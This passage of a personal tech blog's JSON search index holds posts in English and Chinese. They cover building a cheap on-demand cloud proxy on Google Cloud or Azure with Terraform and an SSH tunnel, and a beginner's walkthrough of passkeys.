Cloud and Huawei Cloud. However, Alibaba Cloud requires account verification after a few uses of IP addresses and resources from a country other than China, which asks me to upload my passport, etc. Also, the minimum compute service is monthly instead of consumption-based like Google Cloud. On the other hand, Huawei Cloud is better; compute service can be consumption-based. However, bandwidth charges are per day subscription and not metered, resulting in a daily fee of USD 2! Therefore, I do not recommend Alibaba Cloud and Huawei Cloud for those who are Penny Pinchers. Cloud Agnostic Terraform Script Now we have 2 cloud provider options, Azure and Google. We want to create cloud-agnostic Terraform scripts because it allows us to maintain a single set of code and apply it across multiple cloud providers. This approach allows us to easily switch between different cloud service providers if needed. A cloud-agnostic architecture plus money saving! Let’s structure the folder as below: \\ - root \\ - main.tf - variables.tf - output.tf - provider.tf \\ - modules \\ - google \\ - main.tf - variables.tf - output.tf \\ - azure \\ - main.tf - variables.tf - output.tf The root folder serves as a cloud-agnostic abstract layer, while subfolders under modules, i.e., modules/azure and modules/google, serve as cloud-specific implementation. What you can expect from running root scripts is to provision a cloud server by providing your username and public key, and the return command to set up an SSH tunnel from the output. Use of which provider depends on the cloud_service_provider variable, either azure or google from the example. /variables.tfvariable &quot;cloud_service_provider&quot; &#123; type &#x3D; string description &#x3D; &quot;Cloud Service Provider: azure or google&quot; validation &#123; condition &#x3D; contains([&quot;azure&quot;, &quot;google&quot;], var.cloud_service_provider) error_message &#x3D; &quot;Valid values for var: cloud_service_provider are (azure, google).&quot; &#125; &#125; variable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; variable &quot;google_project&quot; &#123; type &#x3D; string default &#x3D; &quot;no project&quot; description &#x3D; &quot;Google Cloud Project Name.&quot; &#125; locals &#123; # cross variables validation could be improved in Terraform v1.9.0 # tflint-ignore: terraform_unused_declarations validate_project &#x3D; (var.google_project &#x3D;&#x3D; &quot;no project&quot; &amp;&amp; var.cloud_service_provider &#x3D;&#x3D; &quot;google&quot;) ? tobool( &quot;google_project must be provided when the provider is &#39;google&#39;.&quot;) : true &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/variables.tf /main.tf is very simple, it enables the module to implement cloud proxy per requirement and disable the other: /main.tfmodule &quot;azure_server&quot; &#123; source &#x3D; &quot;.&#x2F;modules&#x2F;azure&quot; count &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? 1 : 0 ssh_public_key &#x3D; var.ssh_public_key ssh_username &#x3D; var.ssh_username &#125; module &quot;google_server&quot; &#123; source &#x3D; &quot;.&#x2F;modules&#x2F;google&quot; count &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;google&quot;) ? 1 : 0 ssh_public_key &#x3D; var.ssh_public_key ssh_username &#x3D; var.ssh_username &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/main.tf /output.tf is similar to /main.tf, which returns ip and command as well: /output.tfoutput &quot;ip&quot; &#123; value &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? module.azure_server[0].ip : module.google_server[0].ip &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? module.azure_server[0].command : module.google_server[0].command &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/output.tf Providers in Terraform scripts are removed from modules and put together into /provider.tf. /provider.tfterraform &#123; required_providers &#123; azapi &#x3D; &#123; source &#x3D; &quot;Azure&#x2F;azapi&quot; &#125; azurerm &#x3D; &#123; source &#x3D; &quot;hashicorp&#x2F;azurerm&quot; &#125; google &#x3D; &#123; source &#x3D; &quot;hashicorp&#x2F;google&quot; &#125; &#125; &#125; provider &quot;azapi&quot; &#123; &#125; provider &quot;azurerm&quot; &#123; features &#123;&#125; &#125; provider &quot;google&quot; &#123; project &#x3D; var.google_project region &#x3D; &quot;us-central1&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/provider.tf Full source code: https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/ 📖 neoalienson/cloud_vpn_proxy Setup your own Cloud Agnostic cloud VPN or proxy ⭐ 0 Stars 🍴 0 Forks Language: HCL Notification on Proxy Ready Coming soon… Price comparison Azure Virtual Machine Virtual Network Storage Bandwidth Google Cloud Compute Engine Networking Coming soon… VPN with WireGuard Coming soon… User friendly on and off Coming soon… Reminder to switch off Coming soon…","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"},{"name":"cloud","slug":"cloud","permalink":"https://neo01.com/tags/cloud/"},{"name":"Azure","slug":"Azure","permalink":"https://neo01.com/tags/Azure/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}]},{"title":"管理您自己的 VPN - 省钱达人指南","slug":"2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide-zh-CN","date":"un55fin55","updated":"un22fin22","comments":true,"path":"/zh-CN/2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide/","permalink":"https://neo01.com/zh-CN/2024/01/Manage_Your_Own_VPN_A_Penny-Pinchers_Guide/","excerpt":"抛弃 VPN 订阅，开始像数字游牧民族一样生活 - 减去 Instagram 上值得拍照的咖啡店氛围。只需使用按需付费的云端 VPN 即可（您的钱包会感谢您）！","text":"啊，互联网 - 一个充满知识和猫咪视频的广阔空间。但当您在这个数字海洋中航行时，您可能会发现自己想要更多隐私，或者您只是厌倦了根据您的位置被告知可以和不可以查看什么内容… VPN 和代理服务定价模式的问题 让我们快速看一下截至 2025 年 10 月的 VPN 服务价格 VPN 提供商 每月价格（美元） 订阅每月价格（美元） Surfshark（入门版） $15.45 2 年订阅 $1.99 ExpressVPN（基本版） $12.99 2 年订阅 $3.49 最好的按需付费选项是按月计费。按使用量付费的模式不存在，我们被迫采用基于订阅的模式。基于订阅的模式就像雇用一个坚持签订一年合约的保镖，而您只需要有人在每月一次的可疑回家路上保护您。像我这样的省钱达人不接受这种订阅优惠。 按需云端代理 现在，让我们检视可用于您的 VPN/代理冒险的云端服务。您可以在云端上创建 VPN/代理服务器。为简单起见，让我们从 Google Cloud 上的代理服务器开始。以下是它的工作原理： flowchart LR pc[\"您的电脑\\n在国家 A\\n\\n\"] ssh[\"SSH 通道\\n\\n\"] pc-->ssh proxy[\"Google Cloud 上的代理\\n在国家 B\\n\\n\"] ssh-->proxy target[\"目标网站\\n\\n\"] proxy-->target 流程图说明了在 Google Cloud 上设置代理服务器。您的电脑（PC）在国家 A，您想访问受限制或因您的位置而被封锁内容的目标网站（target）。您从电脑创建 SSH 通道（ssh）到 Google Cloud 上的代理服务器（proxy），该服务器位于国家 B。这允许您绕过地理限制并访问目标网站，就像您在国家 B 一样。 提供商 1. Google Cloud 以下是在 Google Cloud 上创建带有代理（squid）的计算引擎的 Terraform 脚本。 main.tfresource &quot;google_compute_instance&quot; &quot;default&quot; &#123; name &#x3D; &quot;proxy-server&quot; machine_type &#x3D; &quot;e2-micro&quot; zone &#x3D; &quot;us-west1-a&quot; tags &#x3D; [&quot;ssh&quot;] scheduling &#123; provisioning_model &#x3D; &quot;SPOT&quot; automatic_restart &#x3D; false preemptible &#x3D; true &#125; boot_disk &#123; initialize_params &#123; image &#x3D; &quot;ubuntu-os-cloud&#x2F;ubuntu-2004-lts&quot; &#125; &#125; network_interface &#123; network &#x3D; &quot;default&quot; access_config &#123; &#x2F;&#x2F; Ephemeral public IP network_tier &#x3D; &quot;STANDARD&quot; &#125; &#125; service_account &#123; scopes &#x3D; [&quot;cloud-platform&quot;] &#125; metadata &#x3D; &#123; ssh-keys &#x3D; format(&quot;%s:%s&quot;, var.ssh_username, var.ssh_public_key) startup-script &#x3D; &quot;sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid&quot; &#125; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/main.tf variables.tfvariable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/variables.tf output.tfoutput &quot;ip&quot; &#123; value &#x3D; google_compute_instance.default.network_interface.0.access_config.0.nat_ip &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; format(&quot;ssh-keygen -R %s; ssh -L3128:localhost:3128 %s@%s&quot;, google_compute_instance.default.network_interface.0.access_config.0.nat_ip, var.ssh_username, google_compute_instance.default.network_interface.0.access_config.0.nat_ip) &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/google/output.tf 执行 terraform apply： $ terraform apply var.google_access_credentials The json file that contains key of your service account in Google Cloud Enter a value: a.josn var.project Google Cloud Project Name Enter a value: a var.ssh_public_key Public key for SSH Enter a value: ssh-rsa AAAAB... var.ssh_username username of SSH to the compute engine Enter a value: neo Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: + create Terraform will perform the following actions: # google_compute_instance.default will be created + resource &quot;google_compute_instance&quot; &quot;default&quot; &#123; ... + machine_type &#x3D; &quot;e2-micro&quot; + metadata &#x3D; &#123; + &quot;ssh-keys&quot; &#x3D; &quot;neo:ssh-rsa AAAAB...&quot; + &quot;startup-script&quot; &#x3D; &quot;sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid&quot; &#125; ... &#125; Plan: 1 to add, 0 to change, 0 to destroy. Changes to Outputs: + command &#x3D; (known after apply) + ip &#x3D; (known after apply) Do you want to perform these actions? Terraform will perform the actions described above. Only &#39;yes&#39; will be accepted to approve. Enter a value: yes google_compute_instance.default: Creating... google_compute_instance.default: Still creating... [10s elapsed] google_compute_instance.default: Creation complete after 17s [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] Apply complete! Resources: 1 added, 0 changed, 0 destroyed. Outputs: command &#x3D; &quot;ssh -L3128:localhost:3128 neo@123.123.123.123&quot; ip &#x3D; &quot;123.123.123.123&quot; 要设置到代理的 SSH 通道，请使用输出 command 中提供的命令。您可能需要等待片刻，直到代理准备就绪。一旦代理准备就绪，您的浏览器就可以使用 localhost:3128 作为代理。 当云端服务重复使用 IP 地址来创建新的计算实例时，如果您之前曾 SSH 到该 IP 地址，您可能会遇到主机验证错误。这是因为新的计算实例生成了新的主机密钥，该密钥与您在 .ssh/known_hosts 中信任的密钥不符。要解决此问题，您可以使用 ssh-keygen -R 删除受信任的主机密钥，或将私钥从本机发送到新的计算实例。 完成后记得销毁计算引擎： $ terraform destroy google_compute_instance.default: Refreshing state... [id&#x3D;projects&#x2F;f-01man-com&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols: - destroy Terraform will perform the following actions: # google_compute_instance.default will be destroyed - resource &quot;google_compute_instance&quot; &quot;default&quot; &#123; ... &#125; Plan: 0 to add, 0 to change, 1 to destroy. Do you really want to destroy all resources? Terraform will destroy all your managed infrastructure, as shown above. There is no undo. Only &#39;yes&#39; will be accepted to confirm. Enter a value: yes google_compute_instance.default: Destroying... [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server] google_compute_instance.default: Still destroying... [id&#x3D;projects&#x2F;a&#x2F;zones&#x2F;us-west1-a&#x2F;instances&#x2F;proxy-server, 10s elapsed] google_compute_instance.default: Destruction complete after 16s Destroy complete! Resources: 1 destroyed. 鉴于我的使用量极低，例如每月 30 分钟，Google 每月向我收取约 0.20 美元。然而，这并不能阻止我探索其他更便宜的替代方案。 提供商 2. Azure main.tfresource &quot;azurerm_resource_group&quot; &quot;rg&quot; &#123; name &#x3D; &quot;squid-rg&quot; location &#x3D; &quot;West US&quot; &#125; resource &quot;azurerm_virtual_machine&quot; &quot;proxy&quot; &#123; name &#x3D; &quot;squid-proxy-vm&quot; # charge you if you dont delete delete_data_disks_on_termination &#x3D; true delete_os_disk_on_termination &#x3D; true resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location network_interface_ids &#x3D; [azurerm_network_interface.nic.id] vm_size &#x3D; &quot;Standard_B1s&quot; storage_os_disk &#123; name &#x3D; &quot;os&quot; caching &#x3D; &quot;ReadWrite&quot; managed_disk_type &#x3D; &quot;Standard_LRS&quot; create_option &#x3D; &quot;FromImage&quot; os_type &#x3D; &quot;Linux&quot; &#125; storage_image_reference &#123; publisher &#x3D; &quot;Canonical&quot; offer &#x3D; &quot;0001-com-ubuntu-server-jammy&quot; sku &#x3D; &quot;22_04-lts&quot; version &#x3D; &quot;latest&quot; &#125; os_profile &#123; admin_username &#x3D; var.ssh_username computer_name &#x3D; &quot;proxy&quot; custom_data &#x3D; base64encode(&lt;&lt;CUSTOM_DATA #!&#x2F;bin&#x2F;bash sudo apt-get update;sudo apt-get install -y squid;sudo systemctl start squid CUSTOM_DATA ) &#125; os_profile_linux_config &#123; disable_password_authentication &#x3D; true ssh_keys &#123; path &#x3D; &quot;&#x2F;home&#x2F;$&#123;var.ssh_username&#125;&#x2F;.ssh&#x2F;authorized_keys&quot; key_data &#x3D; var.ssh_public_key &#125; &#125; &#125; resource &quot;azurerm_network_interface&quot; &quot;nic&quot; &#123; name &#x3D; &quot;squid-nic&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location ip_configuration &#123; name &#x3D; &quot;squid-ipconfig&quot; subnet_id &#x3D; azurerm_subnet.subnet.id private_ip_address_allocation &#x3D; &quot;Dynamic&quot; public_ip_address_id &#x3D; azurerm_public_ip.proxy.id &#125; &#125; resource &quot;azurerm_subnet&quot; &quot;subnet&quot; &#123; name &#x3D; &quot;squid-subnet&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name virtual_network_name &#x3D; azurerm_virtual_network.vnet.name address_prefixes &#x3D; [&quot;10.0.0.0&#x2F;24&quot;] &#125; resource &quot;azurerm_virtual_network&quot; &quot;vnet&quot; &#123; name &#x3D; &quot;squid-vnet&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name address_space &#x3D; [&quot;10.0.0.0&#x2F;8&quot;] location &#x3D; &quot;West US&quot; &#125; resource &quot;azurerm_public_ip&quot; &quot;proxy&quot; &#123; name &#x3D; &quot;squidPublicIp1&quot; resource_group_name &#x3D; azurerm_resource_group.rg.name location &#x3D; azurerm_resource_group.rg.location allocation_method &#x3D; &quot;Static&quot; lifecycle &#123; create_before_destroy &#x3D; true &#125; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/main.tf variables.tfvariable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/variables.tf output.tfoutput &quot;ip&quot; &#123; value &#x3D; azurerm_public_ip.proxy.ip_address &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; format(&quot;ssh-keygen -R %s; ssh -L3128:localhost:3128 %s@%s&quot;, azurerm_public_ip.proxy.ip_address, var.ssh_username, azurerm_public_ip.proxy.ip_address) &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/modules/azure/output.tf 创建和销毁需要时间。您可以检查 /var/log/cloud-init.log 并寻找 subp.py 和 part 来进行故障排除，例如： 2024-05-07 14:14:02,864 - subp.py[DEBUG]: Running command [&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39;] with allowed return codes [0] (shell&#x3D;False, capture&#x3D;False) 2024-05-07 14:14:02,864 - subp.py[DEBUG]: Exec format error. Missing #! in script? Command: [&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39;] Exit code: - Reason: [Errno 8] Exec format error: b&#39;&#x2F;var&#x2F;lib&#x2F;cloud&#x2F;instance&#x2F;scripts&#x2F;part-001&#39; 其他云端服务提供商 我也尝试过阿里云和华为云。然而，阿里云在使用来自中国以外国家的 IP 地址和资源几次后需要账户验证，要求我上传护照等。此外，最低计算服务是按月计费，而不是像 Google Cloud 那样基于消费。 另一方面，华为云更好；计算服务可以基于消费。然而，带宽费用是按日订阅而不是计量，导致每日费用为 2 美元！因此，我不建议省钱达人使用阿里云和华为云。 云端不可知 Terraform 脚本 现在我们有 2 个云端提供商选项，Azure 和 Google。我们想创建云端不可知的 Terraform 脚本，因为它允许我们维护一组代码并将其应用于多个云端提供商。这种方法允许我们在需要时轻松切换不同的云端服务提供商。云端不可知架构加上省钱！ 让我们将文件夹结构如下： \\ - root \\ - main.tf - variables.tf - output.tf - provider.tf \\ - modules \\ - google \\ - main.tf - variables.tf - output.tf \\ - azure \\ - main.tf - variables.tf - output.tf root 文件夹作为云端不可知的抽象层，而 modules 下的子文件夹，即 modules/azure 和 modules/google，作为云端特定的实现。您可以期望从执行 root 脚本中通过提供您的用户名和公钥来配置云端服务器，并从输出返回设置 SSH 通道的命令。使用哪个提供商取决于 cloud_service_provider 变量，从示例中可以是 azure 或 google。 /variables.tfvariable &quot;cloud_service_provider&quot; &#123; type &#x3D; string description &#x3D; &quot;Cloud Service Provider: azure or google&quot; validation &#123; condition &#x3D; contains([&quot;azure&quot;, &quot;google&quot;], var.cloud_service_provider) error_message &#x3D; &quot;Valid values for var: cloud_service_provider are (azure, google).&quot; &#125; &#125; variable &quot;ssh_username&quot; &#123; type &#x3D; string description &#x3D; &quot;username of SSH to the compute engine&quot; &#125; variable &quot;ssh_public_key&quot; &#123; type &#x3D; string description &#x3D; &quot;Public key for SSH&quot; &#125; variable &quot;google_project&quot; &#123; type &#x3D; string default &#x3D; &quot;no project&quot; description &#x3D; &quot;Google Cloud Project Name.&quot; &#125; locals &#123; # cross variables validation could be improved in Terraform v1.9.0 # tflint-ignore: terraform_unused_declarations validate_project &#x3D; (var.google_project &#x3D;&#x3D; &quot;no project&quot; &amp;&amp; var.cloud_service_provider &#x3D;&#x3D; &quot;google&quot;) ? tobool( &quot;google_project must be provided when the provider is &#39;google&#39;.&quot;) : true &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/variables.tf /main.tf 非常简单，它根据需求启用模块来实现云端代理并停用其他模块： /main.tfmodule &quot;azure_server&quot; &#123; source &#x3D; &quot;.&#x2F;modules&#x2F;azure&quot; count &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? 1 : 0 ssh_public_key &#x3D; var.ssh_public_key ssh_username &#x3D; var.ssh_username &#125; module &quot;google_server&quot; &#123; source &#x3D; &quot;.&#x2F;modules&#x2F;google&quot; count &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;google&quot;) ? 1 : 0 ssh_public_key &#x3D; var.ssh_public_key ssh_username &#x3D; var.ssh_username &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/main.tf /output.tf 与 /main.tf 类似，它也返回 ip 和 command： /output.tfoutput &quot;ip&quot; &#123; value &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? module.azure_server[0].ip : module.google_server[0].ip &#125; output &quot;command&quot; &#123; description &#x3D; &quot;Command to setup ssh tunnel to the proxy server&quot; value &#x3D; (var.cloud_service_provider &#x3D;&#x3D; &quot;azure&quot;) ? module.azure_server[0].command : module.google_server[0].command &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/output.tf Terraform 脚本中的提供商从模块中删除并放在一起到 /provider.tf 中。 /provider.tfterraform &#123; required_providers &#123; azapi &#x3D; &#123; source &#x3D; &quot;Azure&#x2F;azapi&quot; &#125; azurerm &#x3D; &#123; source &#x3D; &quot;hashicorp&#x2F;azurerm&quot; &#125; google &#x3D; &#123; source &#x3D; &quot;hashicorp&#x2F;google&quot; &#125; &#125; &#125; provider &quot;azapi&quot; &#123; &#125; provider &quot;azurerm&quot; &#123; features &#123;&#125; &#125; provider &quot;google&quot; &#123; project &#x3D; var.google_project region &#x3D; &quot;us-central1&quot; &#125; https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/provider.tf 完整源代码：https://github.com/neoalienson/cloud_vpn_proxy/blob/main/server/ 📖 neoalienson/cloud_vpn_proxy Setup your own Cloud Agnostic cloud VPN or proxy ⭐ 0 Stars 🍴 0 Forks Language: HCL 代理就绪通知 即将推出… 价格比较 Azure 虚拟机 虚拟网络 存储 带宽 Google Cloud 计算引擎 网络 即将推出… 使用 WireGuard 的 VPN 即将推出… 用户友好的开关 即将推出… 关闭提醒 即将推出…","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"},{"name":"cloud","slug":"cloud","permalink":"https://neo01.com/tags/cloud/"},{"name":"Azure","slug":"Azure","permalink":"https://neo01.com/tags/Azure/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-CN"},{"title":"Passkeys - 您通往无缝安全的门户","slug":"2023/12/Passkeys_Your_Gateway_to_Seamless_Security-zh-CN","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/12/Passkeys_Your_Gateway_to_Seamless_Security/","permalink":"https://neo01.com/zh-CN/2023/12/Passkeys_Your_Gateway_to_Seamless_Security/","excerpt":"我们能告别那些丑陋、冗长的符号混合密码吗？是的！让我们欢迎 Passkeys，我们时尚性感的网络安全解决方案。","text":"在数字世界中，密码就像您个人宝箱的钥匙，但让我们面对现实，它们更像是一堆您需要时找不到但其他人不知何故可以找到的便利贴。我们能在某种程度上消除密码吗？是的，使用 Passkeys。 Passkey 是一种用于保护对各种在线服务和账户的访问的验证方法。它是一个唯一的密钥对，由为个别用户专门生成的公钥和私钥组成 … 简而言之，使用您的手机或指纹设备与生物识别来验证您的登录。 在采用 Passkeys 之前，您可以在 https://www.passkeys.io/ 上进行试用。记得阅读 https://www.passkeys.io/#How-to-use-a-passkey 的说明。您可以为同一账户在多个设备上创建 passkey。 Passkey 如何运作（简单版） 以下演示在具有指纹传感器和 Windows Hello 的 Windows 上执行。您可以在移动设备上获得相同的体验。 在网站上创建账户 像许多应用程序一样，您需要先创建一个账户。大多数网站会要求您设置密码以让您感到舒适。 使用您喜欢的电子邮件创建账户， 注册被跳过，因为这只是一个演示 创建第一个 passkey 一旦您点击创建按钮，网站会要求您的浏览器设置 passkey。 您的浏览器将您的请求导向具有 passkey 功能的模块。在这种情况下是 Bitwarden。 使用生物识别进行验证。 创建公钥/私钥对。私钥保留在模块中。只有公钥发送回浏览器和网站。 就是这样！网站将您的账户与您的 passkey 关联。您可以登出/退出。 登录 登录与创建账户非常相似。使用 passkey 登录。您不需要提供您的电子邮件地址。 过程是相同的。 您可能会注意到您可以使用多个设备登录。 为您的账户设置第二个 passkey 让我们尝试&quot;使用其他设备&quot; “iPhone、iPad 或 Android 设备” 从您的设备扫描 QR 码。 您的设备告诉网站 QR 码是从您的账户扫描的。 验证后，您的设备生成自己的公钥/私钥对，然后将公钥发送到网站。 您现在可以使用第二个 passkey 登录！ 如果我的移动设备丢失了怎么办 记得为您的账户设置恢复方法！第二个 passkey 可以作为恢复方法，但请选择一个对您自己可靠的方法。否则您最终会像下面这样。 我可以在哪里使用 passkey 以下清单将协助您识别与 passkey 采用兼容的服务。 支持 Passkey 的服务/操作系统： Bitwarden Windows（Windows Hello） iOS Android 支持 Passkey 的网站/应用程序： Amazon Apple ID 仅限 iOS GitHub Google Account Internet Identity LinkedIn npmjs.com WhatsApp（Android 和 iOS） Yahoo 尚未支持 Passkey 但支持多因素验证（MFA）的网站： Atlassian 及其产品系列，如 Bitbucket Docker Gitlab terraform.io Wellfound.com 鼓励您采用 Passkeys 以增强安全性，因为它们不易受到传统网络钓鱼攻击的影响，也不需要记住复杂的密码。 在业界巨头的支持和它们提供的便利性下，Passkeys 将成为数字安全的新标准。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[],"lang":"zh-CN"},{"title":"Passkeys - 您通往無縫安全的門戶","slug":"2023/12/Passkeys_Your_Gateway_to_Seamless_Security-zh-TW","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/12/Passkeys_Your_Gateway_to_Seamless_Security/","permalink":"https://neo01.com/zh-TW/2023/12/Passkeys_Your_Gateway_to_Seamless_Security/","excerpt":"我們能告別那些醜陋、冗長的符號混合密碼嗎？是的！讓我們歡迎 Passkeys，我們時尚性感的網路安全解決方案。","text":"在數位世界中，密碼就像您個人寶箱的鑰匙，但讓我們面對現實，它們更像是一堆您需要時找不到但其他人不知何故可以找到的便利貼。我們能在某種程度上消除密碼嗎？是的，使用 Passkeys。 Passkey 是一種用於保護對各種線上服務和帳戶的存取的驗證方法。它是一個唯一的金鑰對，由為個別使用者專門生成的公鑰和私鑰組成 … 簡而言之，使用您的手機或指紋裝置與生物識別來驗證您的登入。 在採用 Passkeys 之前，您可以在 https://www.passkeys.io/ 上進行試用。記得閱讀 https://www.passkeys.io/#How-to-use-a-passkey 的說明。您可以為同一帳戶在多個裝置上建立 passkey。 Passkey 如何運作（簡單版） 以下示範在具有指紋感應器和 Windows Hello 的 Windows 上執行。您可以在行動裝置上獲得相同的體驗。 在網站上建立帳戶 像許多應用程式一樣，您需要先建立一個帳戶。大多數網站會要求您設定密碼以讓您感到舒適。 使用您喜歡的電子郵件建立帳戶， 註冊被跳過，因為這只是一個示範 建立第一個 passkey 一旦您點擊建立按鈕，網站會要求您的瀏覽器設定 passkey。 您的瀏覽器將您的請求導向具有 passkey 功能的模組。在這種情況下是 Bitwarden。 使用生物識別進行驗證。 建立公鑰/私鑰對。私鑰保留在模組中。只有公鑰發送回瀏覽器和網站。 就是這樣！網站將您的帳戶與您的 passkey 關聯。您可以登出/退出。 登入 登入與建立帳戶非常相似。使用 passkey 登入。您不需要提供您的電子郵件地址。 過程是相同的。 您可能會注意到您可以使用多個裝置登入。 為您的帳戶設定第二個 passkey 讓我們嘗試「使用其他裝置」 「iPhone、iPad 或 Android 裝置」 從您的裝置掃描 QR 碼。 您的裝置告訴網站 QR 碼是從您的帳戶掃描的。 驗證後，您的裝置生成自己的公鑰/私鑰對，然後將公鑰發送到網站。 您現在可以使用第二個 passkey 登入！ 如果我的行動裝置遺失了怎麼辦 記得為您的帳戶設定恢復方法！第二個 passkey 可以作為恢復方法，但請選擇一個對您自己可靠的方法。否則您最終會像下面這樣。 我可以在哪裡使用 passkey 以下清單將協助您識別與 passkey 採用相容的服務。 支援 Passkey 的服務/作業系統： Bitwarden Windows（Windows Hello） iOS Android 支援 Passkey 的網站/應用程式： Amazon Apple ID 僅限 iOS GitHub Google Account Internet Identity LinkedIn npmjs.com WhatsApp（Android 和 iOS） Yahoo 尚未支援 Passkey 但支援多因素驗證（MFA）的網站： Atlassian 及其產品系列，如 Bitbucket Docker Gitlab terraform.io Wellfound.com 鼓勵您採用 Passkeys 以增強安全性，因為它們不易受到傳統網路釣魚攻擊的影響，也不需要記住複雜的密碼。 在業界巨頭的支持和它們提供的便利性下，Passkeys 將成為數位安全的新標準。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[],"lang":"zh-TW"},{"title":"Passkeys - Your Gateway to Seamless Security","slug":"2023/12/Passkeys_Your_Gateway_to_Seamless_Security","date":"un55fin55","updated":"un00fin00","comments":true,"path":"2023/12/Passkeys_Your_Gateway_to_Seamless_Security/","permalink":"https://neo01.com/2023/12/Passkeys_Your_Gateway_to_Seamless_Security/","excerpt":"Can we say goodbye to those ugly, long strings of symbol-mixed passwords? Yes! Let's welcome Passkeys, our sleek and sexy cybersecurity solution.","text":"In the digital world, passwords are like the keys to your personal treasure chest, but let’s face it, they’re more like a bunch of sticky notes you can’t find when you need them but someone else somehow can. Can we eliminate passwords by some degree? Yes, with Passkeys. Passkey is a type of authentication method used to secure access to various online services and accounts. It is a unique key pair consisting of a public key and a private key that is generated specifically for an individual user … in short, use your phone or fingerprint device with biometric to authenticate your login. Before adopting Passkeys you can have a trial on https://www.passkeys.io/. Remember to read instructions from https://www.passkeys.io/#How-to-use-a-passkey. You can create a passkey on multiple devices for the same account. How Passkey works for dummies Below demo runs on a Windows with fingerprint sensor and Windows Hello. You can have the same experience on mobile. Creating an account on website Like many applications, you need to create an account first. Most websites would ask you for a password setup to keep you comfortable. Create an account with email you like, Registration is skipped as this is just a demo Create first passkey Once you click the create button, the website would ask your browser to setup passkey. Your browser directs your request to a module which has passkey capability. Bitwarden in this case. Authenticate with biometric. Create a public/private key pair. Private key stays in the module. Only public key send back to browser and the website. That’s it! The website associates your account with your passkey. You can logout/sign out. Login Login is very similar to creating an account. Sign in with a passkey. You don’t need to provide your email address. The process is the same. You may notice that you can use more than one device to login. Setting up second passkey for your account Let’s try “Use another device” “iPhone, iPad, or Android device” Scan QR code from your device. Your device tells the website that the QR code is scanned from your account. After authentication, your device generates its own public/private key pair, and then sends the public key to the website. You can now use the second passkey to login! What if my mobile device is lost Remember to setup recovery method for your account! Second passkey can be a recovery but please pick a reliable one to yourself. Otherwise you will end up like below. Where can I use passkey The following list will assist you in identifying services that are compatible with passkey adoption. 